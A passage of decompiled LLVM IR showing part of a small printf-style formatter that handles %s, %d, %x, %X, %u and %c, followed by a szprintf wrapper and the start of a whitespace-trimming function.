  %stack_var_-36.030 = phi i32 [ %v5_80486b2, %dec_label_pc_8048697 ], [ 0, %dec_label_pc_80486b8.preheader ]
  store i32 %v4_80486b832, i32* %eax.global-to-local, align 4
  %v2_80486c4 = load i8, i8* %stack_var_8.131, align 1
  %v3_80486c4 = zext i8 %v2_80486c4 to i32
  %v6_80486c4 = or i32 %v3_80486c4, %v5_80486bb33
  store i32 %v6_80486c4, i32* %eax.global-to-local, align 4
  %tmp67 = icmp ult i8 %v2_80486c4, 58
  br i1 %tmp67, label %dec_label_pc_8048697, label %dec_label_pc_80486ca

dec_label_pc_80486ca:                             ; preds = %dec_label_pc_8048697, %dec_label_pc_80486c1, %dec_label_pc_80486b8.preheader
  %stack_var_-36.0.lcssa = phi i32 [ 0, %dec_label_pc_80486b8.preheader ], [ %stack_var_-36.030, %dec_label_pc_80486c1 ], [ %v5_80486b2, %dec_label_pc_8048697 ]
  %stack_var_8.1.lcssa = phi i8* [ %stack_var_8.0.lcssa, %dec_label_pc_80486b8.preheader ], [ %stack_var_8.131, %dec_label_pc_80486c1 ], [ %v22_80486b5, %dec_label_pc_8048697 ]
  %v4_80486b8.lcssa = phi i32 [ %v4_80486b824, %dec_label_pc_80486b8.preheader ], [ %v4_80486b832, %dec_label_pc_80486c1 ], [ %v5_80486b5, %dec_label_pc_8048697 ]
  %v5_80486bb.lcssa = phi i32 [ %v5_80486bb27, %dec_label_pc_80486b8.preheader ], [ %v5_80486bb33, %dec_label_pc_80486c1 ], [ %v5_80486bb, %dec_label_pc_8048697 ]
  store i32 %v4_80486b8.lcssa, i32* %eax.global-to-local, align 4
  %v2_80486cd = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_80486cd = zext i8 %v2_80486cd to i32
  %v6_80486cd = or i32 %v3_80486cd, %v5_80486bb.lcssa
  store i32 %v6_80486cd, i32* %eax.global-to-local, align 4
  %v10_80486cf = icmp eq i8 %v2_80486cd, 115
  %v1_80486d1 = icmp eq i1 %v10_80486cf, false
  br i1 %v1_80486d1, label %dec_label_pc_8048715, label %dec_label_pc_80486d3

dec_label_pc_80486d3:                             ; preds = %dec_label_pc_80486ca
  %v1_80486d6 = add i32 %stack_var_12.150, 4
  store i32 %stack_var_12.150, i32* %eax.global-to-local, align 4
  %v1_80486de = inttoptr i32 %stack_var_12.150 to i32*
  %v2_80486de = load i32, i32* %v1_80486de, align 4
  store i32 %v2_80486de, i32* %eax.global-to-local, align 4
  %v4_80486e3 = icmp eq i32 %v2_80486de, 0
  br i1 %v4_80486e3, label %dec_label_pc_80486f8, label %dec_label_pc_80486e9

dec_label_pc_80486e9:                             ; preds = %dec_label_pc_80486d3
  store i32 %v2_80486de, i32* %eax.global-to-local, align 4
  %v5_80486ec = inttoptr i32 %v2_80486de to i8*
  br label %dec_label_pc_80486f8

dec_label_pc_80486f8:                             ; preds = %dec_label_pc_80486d3, %dec_label_pc_80486e9
  %storemerge = phi i8* [ %v5_80486ec, %dec_label_pc_80486e9 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805084c.12, i32 0, i32 0), %dec_label_pc_80486d3 ]
  %v4_80486f8 = ptrtoint i8* %storemerge to i32
  store i32 %v4_80486f8, i32* %eax.global-to-local, align 4
  %v5_80486fb = add i32 %v0_8048837, -4
  %v6_80486fb = inttoptr i32 %v5_80486fb to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_80486fb, align 4
  %v5_80486fe = add i32 %v0_8048837, -8
  %v6_80486fe = inttoptr i32 %v5_80486fe to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_80486fe, align 4
  %v0_8048701 = load i32, i32* %eax.global-to-local, align 4
  %v2_8048701 = add i32 %v0_8048837, -12
  %v3_8048701 = inttoptr i32 %v2_8048701 to i32*
  store i32 %v0_8048701, i32* %v3_8048701, align 4
  %v5_8048702 = add i32 %v0_8048837, -16
  %v6_8048702 = inttoptr i32 %v5_8048702 to i32*
  store i32 %tmp3, i32* %v6_8048702, align 4
  %v5_8048705 = inttoptr i32 %stack_var_-36.0.lcssa to i8*
  %v6_8048705 = call i32 @prints(i32 %v4_80486f8, i8* %v5_8048705, i32 %stack_var_-32.0.lcssa, i32 %stack_var_-28.152)
  store i32 %v6_8048705, i32* %eax.global-to-local, align 4
  %v0_804870a = load i32, i32* @esp, align 4
  %v1_804870a = add i32 %v0_804870a, 16
  %v5_804870d = add i32 %v6_8048705, %stack_var_-28.152
  br label %dec_label_pc_8048849

dec_label_pc_8048715:                             ; preds = %dec_label_pc_80486ca
  store i32 %v4_80486b8.lcssa, i32* %eax.global-to-local, align 4
  %v2_8048718 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_8048718 = zext i8 %v2_8048718 to i32
  %v6_8048718 = or i32 %v3_8048718, %v5_80486bb.lcssa
  store i32 %v6_8048718, i32* %eax.global-to-local, align 4
  %v10_804871a = icmp eq i8 %v2_8048718, 100
  %v1_804871c = icmp eq i1 %v10_804871a, false
  br i1 %v1_804871c, label %dec_label_pc_804874e, label %dec_label_pc_804871e

dec_label_pc_804871e:                             ; preds = %dec_label_pc_8048715
  %v1_8048721 = add i32 %stack_var_12.150, 4
  store i32 %stack_var_12.150, i32* %eax.global-to-local, align 4
  %v1_8048729 = inttoptr i32 %stack_var_12.150 to i32*
  %v2_8048729 = load i32, i32* %v1_8048729, align 4
  store i32 %v2_8048729, i32* %eax.global-to-local, align 4
  %v1_804872e = add i32 %v0_8048837, -8
  %v2_804872e = inttoptr i32 %v1_804872e to i32*
  store i32 97, i32* %v2_804872e, align 4
  %v5_8048730 = add i32 %v0_8048837, -12
  %v6_8048730 = inttoptr i32 %v5_8048730 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_8048730, align 4
  %v5_8048733 = add i32 %v0_8048837, -16
  %v6_8048733 = inttoptr i32 %v5_8048733 to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_8048733, align 4
  %v1_8048736 = add i32 %v0_8048837, -20
  %v2_8048736 = inttoptr i32 %v1_8048736 to i32*
  store i32 1, i32* %v2_8048736, align 4
  %v1_8048738 = add i32 %v0_8048837, -24
  %v2_8048738 = inttoptr i32 %v1_8048738 to i32*
  store i32 10, i32* %v2_8048738, align 4
  %v0_804873a = load i32, i32* %eax.global-to-local, align 4
  %v2_804873a = add i32 %v0_8048837, -28
  %v3_804873a = inttoptr i32 %v2_804873a to i32*
  store i32 %v0_804873a, i32* %v3_804873a, align 4
  %v5_804873b = add i32 %v0_8048837, -32
  %v6_804873b = inttoptr i32 %v5_804873b to i32*
  store i32 %tmp3, i32* %v6_804873b, align 4
  %v1_804873e = call i32 @printi(i32 %v1_8048721)
  store i32 %v1_804873e, i32* %eax.global-to-local, align 4
  %v0_8048743 = load i32, i32* @esp, align 4
  %v1_8048743 = add i32 %v0_8048743, 32
  %v5_8048746 = add i32 %v1_804873e, %stack_var_-28.152
  br label %dec_label_pc_8048849

dec_label_pc_804874e:                             ; preds = %dec_label_pc_8048715
  store i32 %v4_80486b8.lcssa, i32* %eax.global-to-local, align 4
  %v2_8048751 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_8048751 = zext i8 %v2_8048751 to i32
  %v6_8048751 = or i32 %v3_8048751, %v5_80486bb.lcssa
  store i32 %v6_8048751, i32* %eax.global-to-local, align 4
  %v10_8048753 = icmp eq i8 %v2_8048751, 120
  %v1_8048755 = icmp eq i1 %v10_8048753, false
  br i1 %v1_8048755, label %dec_label_pc_8048787, label %dec_label_pc_8048757

dec_label_pc_8048757:                             ; preds = %dec_label_pc_804874e
  %v1_804875a = add i32 %stack_var_12.150, 4
  store i32 %stack_var_12.150, i32* %eax.global-to-local, align 4
  %v1_8048762 = inttoptr i32 %stack_var_12.150 to i32*
  %v2_8048762 = load i32, i32* %v1_8048762, align 4
  store i32 %v2_8048762, i32* %eax.global-to-local, align 4
  %v1_8048767 = add i32 %v0_8048837, -8
  %v2_8048767 = inttoptr i32 %v1_8048767 to i32*
  store i32 97, i32* %v2_8048767, align 4
  %v5_8048769 = add i32 %v0_8048837, -12
  %v6_8048769 = inttoptr i32 %v5_8048769 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_8048769, align 4
  %v5_804876c = add i32 %v0_8048837, -16
  %v6_804876c = inttoptr i32 %v5_804876c to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_804876c, align 4
  %v1_804876f = add i32 %v0_8048837, -20
  %v2_804876f = inttoptr i32 %v1_804876f to i32*
  store i32 0, i32* %v2_804876f, align 4
  %v1_8048771 = add i32 %v0_8048837, -24
  %v2_8048771 = inttoptr i32 %v1_8048771 to i32*
  store i32 16, i32* %v2_8048771, align 4
  %v0_8048773 = load i32, i32* %eax.global-to-local, align 4
  %v2_8048773 = add i32 %v0_8048837, -28
  %v3_8048773 = inttoptr i32 %v2_8048773 to i32*
  store i32 %v0_8048773, i32* %v3_8048773, align 4
  %v5_8048774 = add i32 %v0_8048837, -32
  %v6_8048774 = inttoptr i32 %v5_8048774 to i32*
  store i32 %tmp3, i32* %v6_8048774, align 4
  %v1_8048777 = call i32 @printi(i32 %v1_804875a)
  store i32 %v1_8048777, i32* %eax.global-to-local, align 4
  %v0_804877c = load i32, i32* @esp, align 4
  %v1_804877c = add i32 %v0_804877c, 32
  %v5_804877f = add i32 %v1_8048777, %stack_var_-28.152
  br label %dec_label_pc_8048849

dec_label_pc_8048787:                             ; preds = %dec_label_pc_804874e
  store i32 %v4_80486b8.lcssa, i32* %eax.global-to-local, align 4
  %v2_804878a = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_804878a = zext i8 %v2_804878a to i32
  %v6_804878a = or i32 %v3_804878a, %v5_80486bb.lcssa
  store i32 %v6_804878a, i32* %eax.global-to-local, align 4
  %v10_804878c = icmp eq i8 %v2_804878a, 88
  %v1_804878e = icmp eq i1 %v10_804878c, false
  br i1 %v1_804878e, label %dec_label_pc_80487c0, label %dec_label_pc_8048790

dec_label_pc_8048790:                             ; preds = %dec_label_pc_8048787
  %v1_8048793 = add i32 %stack_var_12.150, 4
  store i32 %stack_var_12.150, i32* %eax.global-to-local, align 4
  %v1_804879b = inttoptr i32 %stack_var_12.150 to i32*
  %v2_804879b = load i32, i32* %v1_804879b, align 4
  store i32 %v2_804879b, i32* %eax.global-to-local, align 4
  %v1_80487a0 = add i32 %v0_8048837, -8
  %v2_80487a0 = inttoptr i32 %v1_80487a0 to i32*
  store i32 65, i32* %v2_80487a0, align 4
  %v5_80487a2 = add i32 %v0_8048837, -12
  %v6_80487a2 = inttoptr i32 %v5_80487a2 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_80487a2, align 4
  %v5_80487a5 = add i32 %v0_8048837, -16
  %v6_80487a5 = inttoptr i32 %v5_80487a5 to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_80487a5, align 4
  %v1_80487a8 = add i32 %v0_8048837, -20
  %v2_80487a8 = inttoptr i32 %v1_80487a8 to i32*
  store i32 0, i32* %v2_80487a8, align 4
  %v1_80487aa = add i32 %v0_8048837, -24
  %v2_80487aa = inttoptr i32 %v1_80487aa to i32*
  store i32 16, i32* %v2_80487aa, align 4
  %v0_80487ac = load i32, i32* %eax.global-to-local, align 4
  %v2_80487ac = add i32 %v0_8048837, -28
  %v3_80487ac = inttoptr i32 %v2_80487ac to i32*
  store i32 %v0_80487ac, i32* %v3_80487ac, align 4
  %v5_80487ad = add i32 %v0_8048837, -32
  %v6_80487ad = inttoptr i32 %v5_80487ad to i32*
  store i32 %tmp3, i32* %v6_80487ad, align 4
  %v1_80487b0 = call i32 @printi(i32 %v1_8048793)
  store i32 %v1_80487b0, i32* %eax.global-to-local, align 4
  %v0_80487b5 = load i32, i32* @esp, align 4
  %v1_80487b5 = add i32 %v0_80487b5, 32
  %v5_80487b8 = add i32 %v1_80487b0, %stack_var_-28.152
  br label %dec_label_pc_8048849

dec_label_pc_80487c0:                             ; preds = %dec_label_pc_8048787
  store i32 %v4_80486b8.lcssa, i32* %eax.global-to-local, align 4
  %v2_80487c3 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_80487c3 = zext i8 %v2_80487c3 to i32
  %v6_80487c3 = or i32 %v3_80487c3, %v5_80486bb.lcssa
  store i32 %v6_80487c3, i32* %eax.global-to-local, align 4
  %v10_80487c5 = icmp eq i8 %v2_80487c3, 117
  %v1_80487c7 = icmp eq i1 %v10_80487c5, false
  br i1 %v1_80487c7, label %dec_label_pc_80487f6, label %dec_label_pc_80487c9

dec_label_pc_80487c9:                             ; preds = %dec_label_pc_80487c0
  %v1_80487cc = add i32 %stack_var_12.150, 4
  store i32 %stack_var_12.150, i32* %eax.global-to-local, align 4
  %v1_80487d4 = inttoptr i32 %stack_var_12.150 to i32*
  %v2_80487d4 = load i32, i32* %v1_80487d4, align 4
  store i32 %v2_80487d4, i32* %eax.global-to-local, align 4
  %v1_80487d9 = add i32 %v0_8048837, -8
  %v2_80487d9 = inttoptr i32 %v1_80487d9 to i32*
  store i32 97, i32* %v2_80487d9, align 4
  %v5_80487db = add i32 %v0_8048837, -12
  %v6_80487db = inttoptr i32 %v5_80487db to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_80487db, align 4
  %v5_80487de = add i32 %v0_8048837, -16
  %v6_80487de = inttoptr i32 %v5_80487de to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_80487de, align 4
  %v1_80487e1 = add i32 %v0_8048837, -20
  %v2_80487e1 = inttoptr i32 %v1_80487e1 to i32*
  store i32 0, i32* %v2_80487e1, align 4
  %v1_80487e3 = add i32 %v0_8048837, -24
  %v2_80487e3 = inttoptr i32 %v1_80487e3 to i32*
  store i32 10, i32* %v2_80487e3, align 4
  %v0_80487e5 = load i32, i32* %eax.global-to-local, align 4
  %v2_80487e5 = add i32 %v0_8048837, -28
  %v3_80487e5 = inttoptr i32 %v2_80487e5 to i32*
  store i32 %v0_80487e5, i32* %v3_80487e5, align 4
  %v5_80487e6 = add i32 %v0_8048837, -32
  %v6_80487e6 = inttoptr i32 %v5_80487e6 to i32*
  store i32 %tmp3, i32* %v6_80487e6, align 4
  %v1_80487e9 = call i32 @printi(i32 %v1_80487cc)
  store i32 %v1_80487e9, i32* %eax.global-to-local, align 4
  %v0_80487ee = load i32, i32* @esp, align 4
  %v1_80487ee = add i32 %v0_80487ee, 32
  %v5_80487f1 = add i32 %v1_80487e9, %stack_var_-28.152
  br label %dec_label_pc_8048849

dec_label_pc_80487f6:                             ; preds = %dec_label_pc_80487c0
  store i32 %v4_80486b8.lcssa, i32* %eax.global-to-local, align 4
  %v2_80487f9 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_80487f9 = zext i8 %v2_80487f9 to i32
  %v6_80487f9 = or i32 %v3_80487f9, %v5_80486bb.lcssa
  store i32 %v6_80487f9, i32* %eax.global-to-local, align 4
  %v10_80487fb = icmp eq i8 %v2_80487f9, 99
  %v1_80487fd = icmp eq i1 %v10_80487fb, false
  br i1 %v1_80487fd, label %dec_label_pc_8048849, label %dec_label_pc_80487ff

dec_label_pc_80487ff:                             ; preds = %dec_label_pc_80487f6
  %v1_8048802 = add i32 %stack_var_12.150, 4
  store i32 %stack_var_12.150, i32* %eax.global-to-local, align 4
  %v1_804880a = inttoptr i32 %stack_var_12.150 to i32*
  %v2_804880a = load i32, i32* %v1_804880a, align 4
  store i32 %v2_804880a, i32* %stack_var_-6, align 4
  %v5_8048813 = add i32 %v0_8048837, -4
  %v6_8048813 = inttoptr i32 %v5_8048813 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_8048813, align 4
  %v5_8048816 = add i32 %v0_8048837, -8
  %v6_8048816 = inttoptr i32 %v5_8048816 to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_8048816, align 4
  store i32 %v2_8048819, i32* %eax.global-to-local, align 4
  %v2_804881c = add i32 %v0_8048837, -12
  %v3_804881c = inttoptr i32 %v2_804881c to i32*
  store i32 %v2_8048819, i32* %v3_804881c, align 4
  %v5_804881d = add i32 %v0_8048837, -16
  %v6_804881d = inttoptr i32 %v5_804881d to i32*
  store i32 %tmp3, i32* %v6_804881d, align 4
  %v0_8048820 = load i32, i32* %stack_var_-6, align 4
  %v6_8048820 = call i32 @prints(i32 %v0_8048820, i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_8048820, i32* %eax.global-to-local, align 4
  %v0_8048825 = load i32, i32* @esp, align 4
  %v1_8048825 = add i32 %v0_8048825, 16
  %v5_8048828 = add i32 %v6_8048820, %stack_var_-28.152
  br label %dec_label_pc_8048849

dec_label_pc_804882d:                             ; preds = %dec_label_pc_8048663, %dec_label_pc_8048639
  %stack_var_8.2 = phi i8* [ %stack_var_8.453, %dec_label_pc_8048639 ], [ %v22_8048646, %dec_label_pc_8048663 ]
  %v4_804882d = ptrtoint i8* %stack_var_8.2 to i32
  store i32 %v4_804882d, i32* %eax.global-to-local, align 4
  %v2_8048830 = load i8, i8* %stack_var_8.2, align 1
  %v3_8048830 = zext i8 %v2_8048830 to i32
  store i32 %v3_8048830, i32* %eax.global-to-local, align 4
  %v2_804883a = add i32 %v0_8048837, -12
  %v3_804883a = inttoptr i32 %v2_804883a to i32*
  store i32 %v3_8048830, i32* %v3_804883a, align 4
  %v5_804883b = add i32 %v0_8048837, -16
  %v6_804883b = inttoptr i32 %v5_804883b to i32*
  store i32 %tmp3, i32* %v6_804883b, align 4
  %v2_804883e = inttoptr i32 %stack_var_-28.152 to i32*
  %v3_804883e = call i32 @printchar(i32* %v2_804883e, i32 %stack_var_-24.149)
  store i32 %v3_804883e, i32* %eax.global-to-local, align 4
  %v0_8048843 = load i32, i32* @esp, align 4
  %v1_8048843 = add i32 %v0_8048843, 16
  %v4_8048846 = add i32 %stack_var_-28.152, 1
  br label %dec_label_pc_8048849

dec_label_pc_8048849:                             ; preds = %dec_label_pc_80487f6, %dec_label_pc_80487ff, %dec_label_pc_80487c9, %dec_label_pc_8048790, %dec_label_pc_8048757, %dec_label_pc_804871e, %dec_label_pc_80486f8, %dec_label_pc_804882d
  %v4_80486fb64 = phi i32 [ %v1_8048843, %dec_label_pc_804882d ], [ %v0_8048837, %dec_label_pc_80487f6 ], [ %v1_8048825, %dec_label_pc_80487ff ], [ %v1_80487ee, %dec_label_pc_80487c9 ], [ %v1_80487b5, %dec_label_pc_8048790 ], [ %v1_804877c, %dec_label_pc_8048757 ], [ %v1_8048743, %dec_label_pc_804871e ], [ %v1_804870a, %dec_label_pc_80486f8 ]
  %stack_var_-24.0 = phi i32 [ %stack_var_-24.149, %dec_label_pc_804882d ], [ %stack_var_-24.149, %dec_label_pc_80487f6 ], [ %stack_var_-24.149, %dec_label_pc_80487ff ], [ %stack_var_-24.149, %dec_label_pc_80487c9 ], [ %stack_var_-24.149, %dec_label_pc_8048790 ], [ %stack_var_-24.149, %dec_label_pc_8048757 ], [ %stack_var_-24.149, %dec_label_pc_804871e ], [ %v2_80486de, %dec_label_pc_80486f8 ]
  %stack_var_12.0 = phi i32 [ %stack_var_12.150, %dec_label_pc_804882d ], [ %stack_var_12.150, %dec_label_pc_80487f6 ], [ %v1_8048802, %dec_label_pc_80487ff ], [ %v1_80487cc, %dec_label_pc_80487c9 ], [ %v1_8048793, %dec_label_pc_8048790 ], [ %v1_804875a, %dec_label_pc_8048757 ], [ %v1_8048721, %dec_label_pc_804871e ], [ %v1_80486d6, %dec_label_pc_80486f8 ]
  %stack_var_8.3 = phi i8* [ %stack_var_8.2, %dec_label_pc_804882d ], [ %stack_var_8.1.lcssa, %dec_label_pc_80487f6 ], [ %stack_var_8.1.lcssa, %dec_label_pc_80487ff ], [ %stack_var_8.1.lcssa, %dec_label_pc_80487c9 ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048790 ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048757 ], [ %stack_var_8.1.lcssa, %dec_label_pc_804871e ], [ %stack_var_8.1.lcssa, %dec_label_pc_80486f8 ]
  %stack_var_-28.0 = phi i32 [ %v4_8048846, %dec_label_pc_804882d ], [ %stack_var_-28.152, %dec_label_pc_80487f6 ], [ %v5_8048828, %dec_label_pc_80487ff ], [ %v5_80487f1, %dec_label_pc_80487c9 ], [ %v5_80487b8, %dec_label_pc_8048790 ], [ %v5_804877f, %dec_label_pc_8048757 ], [ %v5_8048746, %dec_label_pc_804871e ], [ %v5_804870d, %dec_label_pc_80486f8 ]
  %v4_8048849 = ptrtoint i8* %stack_var_8.3 to i32
  %v5_8048849 = add i32 %v4_8048849, 1
  %stack_var_8.4 = inttoptr i32 %v5_8048849 to i8*
  store i32 %v5_8048849, i32* %eax.global-to-local, align 4
  %v2_804884f = load i8, i8* %stack_var_8.4, align 1
  %v3_804884f = zext i8 %v2_804884f to i32
  %v5_804884f = and i32 %v5_8048849, -256
  %v6_804884f = or i32 %v3_804884f, %v5_804884f
  store i32 %v6_804884f, i32* %eax.global-to-local, align 4
  %v4_8048851 = icmp eq i8 %v2_804884f, 0
  %v1_8048853 = icmp eq i1 %v4_8048851, false
  br i1 %v1_8048853, label %dec_label_pc_8048639, label %dec_label_pc_8048859

dec_label_pc_8048859:                             ; preds = %dec_label_pc_8048849, %dec_label_pc_8048646, %entry
  %stack_var_-28.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-28.152, %dec_label_pc_8048646 ], [ %stack_var_-28.0, %dec_label_pc_8048849 ]
  %v4_8048859 = icmp eq i32* %arg1, null
  br i1 %v4_8048859, label %dec_label_pc_8048867, label %dec_label_pc_804885f

dec_label_pc_804885f:                             ; preds = %dec_label_pc_8048859
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v2_8048862 = load i32, i32* %arg1, align 4
  store i32 %v2_8048862, i32* %eax.global-to-local, align 4
  %v1_8048864 = inttoptr i32 %v2_8048862 to i8*
  store i8 0, i8* %v1_8048864, align 1
  br label %dec_label_pc_8048867

dec_label_pc_8048867:                             ; preds = %dec_label_pc_8048859, %dec_label_pc_804885f
  store i32 %stack_var_-28.1.lcssa, i32* %eax.global-to-local, align 4
  ret i32 %stack_var_-28.1.lcssa

; uselistorder directives
  uselistorder i32 %v5_804884f, { 1, 0 }
  uselistorder i8* %stack_var_8.4, { 1, 0 }
  uselistorder i32 %v5_8048849, { 3, 2, 1, 0 }
  uselistorder i8* %stack_var_8.2, { 0, 2, 1 }
  uselistorder i32 %v2_80486de, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v5_80486bb.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_80486b8.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8* %stack_var_8.1.lcssa, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-36.0.lcssa, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %stack_var_-32.0.lcssa, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_8048685, { 1, 2, 3, 0 }
  uselistorder i8* %v22_8048646, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-24.149, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_12.150, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32 %stack_var_8.4.in51, { 2, 1, 0 }
  uselistorder i32 %stack_var_-28.152, { 0, 3, 2, 1, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder i32 %v0_8048837, { 38, 1, 0, 5, 4, 3, 2, 12, 11, 10, 9, 8, 7, 6, 19, 18, 17, 16, 15, 14, 13, 26, 25, 24, 23, 22, 21, 20, 33, 32, 31, 30, 29, 28, 27, 37, 36, 35, 34 }
  uselistorder i32 %tmp3, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 6, 7, 8, 64, 65, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 50, 51, 52, 53, 49, 0, 3, 54, 55, 1, 2, 56, 57, 58, 59, 60, 61, 62, 63, 4, 5 }
  uselistorder i32 (i32)* @printi, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32, i32)* @prints, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_8048867, { 1, 0 }
  uselistorder label %dec_label_pc_8048849, { 7, 1, 0, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_80486f8, { 1, 0 }
  uselistorder label %dec_label_pc_80486ca, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80486c1, { 1, 0 }
  uselistorder label %dec_label_pc_8048685, { 1, 0 }
  uselistorder label %dec_label_pc_8048639, { 1, 0 }
}

define i32 @szprintf(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %v4_8048875 = ptrtoint i32* %stack_var_12 to i32
  %v4_8048886 = call i32 @print(i32* nonnull %stack_var_4, i32 %arg1, i32 %v4_8048875)
  ret i32 %v4_8048886
}

define i32 @trim() local_unnamed_addr {
entry:
  %tmp11 = call i8* @__decompiler_undefined_function_4()
  %tmp18 = ptrtoint i8* %tmp11 to i32
  %v3_80488a3 = call i32 @strlen(i8* %tmp11)
  %v1_80488ab = add i32 %v3_80488a3, -1
  br label %dec_label_pc_80488b4

dec_label_pc_80488b1:                             ; preds = %dec_label_pc_80488b4
  %v4_80488b1 = add i32 %stack_var_-12.0, 1
  br label %dec_label_pc_80488b4

dec_label_pc_80488b4:                             ; preds = %entry, %dec_label_pc_80488b1
  %stack_var_-12.0 = phi i32 [ 0, %entry ], [ %v4_80488b1, %dec_label_pc_80488b1 ]
  %v6_80488b7 = add i32 %stack_var_-12.0, %tmp18
  %v1_80488ba = inttoptr i32 %v6_80488b7 to i8*
  %v2_80488ba = load i8, i8* %v1_80488ba, align 1
  %v2_80488bc = sext i8 %v2_80488ba to i32
  %v2_80488bf = mul nsw i32 %v2_80488bc, 2
  %v0_80488c3 = load i32, i32* inttoptr (i32 134558520 to i32*), align 8
  %v2_80488c8 = add i32 %v0_80488c3, %v2_80488bf
  %v1_80488cb = inttoptr i32 %v2_80488c8 to i16*
  %v2_80488cb = load i16, i16* %v1_80488cb, align 2
  %v1_80488d3 = and i16 %v2_80488cb, 32
  %v2_80488d3 = icmp eq i16 %v1_80488d3, 0
  %v1_80488d8 = icmp eq i1 %v2_80488d3, false
  br i1 %v1_80488d8, label %dec_label_pc_80488b1, label %dec_label_pc_80488df.preheader

dec_label_pc_80488df.preheader:                   ; preds = %dec_label_pc_80488b4
  %v5_80488e524 = icmp slt i32 %v1_80488ab, %stack_var_-12.0
  br i1 %v5_80488e524, label %dec_label_pc_804890d, label %dec_label_pc_80488e7.lr.ph

dec_label_pc_80488e7.lr.ph:                       ; preds = %dec_label_pc_80488df.preheader
  %v0_80488f6.pre = load i32, i32* @global_var_8053338, align 8
  br label %dec_label_pc_80488e7

dec_label_pc_80488dc:                             ; preds = %dec_label_pc_80488e7
  %v5_80488dc = add i32 %stack_var_-8.0.in25, -1
  %v5_80488e5 = icmp slt i32 %v5_80488dc, %stack_var_-12.0
  br i1 %v5_80488e5, label %dec_label_pc_804890d, label %dec_label_pc_80488e7

dec_label_pc_80488e7:                             ; preds = %dec_label_pc_80488e7.lr.ph, %dec_label_pc_80488dc
  %stack_var_-8.0.in25 = phi i32 [ %v1_80488ab, %dec_label_pc_80488e7.lr.ph ], [ %v5_80488dc, %dec_label_pc_80488dc ]
  %v6_80488ea = add i32 %stack_var_-8.0.in25, %tmp18
  %v1_80488ed = inttoptr i32 %v6_80488ea to i8*
  %v2_80488ed = load i8, i8* %v1_80488ed, align 1
  %v2_80488ef = sext i8 %v2_80488ed to i32
  %v2_80488f2 = mul nsw i32 %v2_80488ef, 2
  %v2_80488fb = add i32 %v0_80488f6.pre, %v2_80488f2
  %v1_80488fe = inttoptr i32 %v2_80488fb to i16*
  %v2_80488fe = load i16, i16* %v1_80488fe, align 2
  %v1_8048906 = and i16 %v2_80488fe, 32
  %v2_8048906 = icmp eq i16 %v1_8048906, 0
  %v1_804890b = icmp eq i1 %v2_8048906, false
  br i1 %v1_804890b, label %dec_label_pc_80488dc, label %dec_label_pc_804890d

dec_label_pc_804890d:                             ; preds = %dec_label_pc_80488dc, %dec_label_pc_80488e7, %dec_label_pc_80488df.preheader
  %stack_var_-8.0.in.lcssa = phi i32 [ %v1_80488ab, %dec_label_pc_80488df.preheader ], [ %stack_var_-8.0.in25, %dec_label_pc_80488e7 ], [ %v5_80488dc, %dec_label_pc_80488dc ]
  %v7_804893520 = icmp sgt i32 %stack_var_-12.0, %stack_var_-8.0.in.lcssa
  br i1 %v7_804893520, label %dec_label_pc_8048937, label %dec_label_pc_8048915

dec_label_pc_8048915:                             ; preds = %dec_label_pc_804890d, %dec_label_pc_8048915
  %v6_804893f22 = phi i32 [ %v6_804893f, %dec_label_pc_8048915 ], [ %tmp18, %dec_label_pc_804890d ]
  %storemerge.in21 = phi i32 [ %v5_804892c, %dec_label_pc_8048915 ], [ %stack_var_-12.0, %dec_label_pc_804890d ]
  %v6_8048925 = add i32 %storemerge.in21, %tmp18
  %v1_8048928 = inttoptr i32 %v6_8048925 to i8*
  %v2_8048928 = load i8, i8* %v1_8048928, align 1
  %v3_804892a = inttoptr i32 %v6_804893f22 to i8*
  store i8 %v2_8048928, i8* %v3_804892a, align 1
  %v5_804892c = add i32 %storemerge.in21, 1
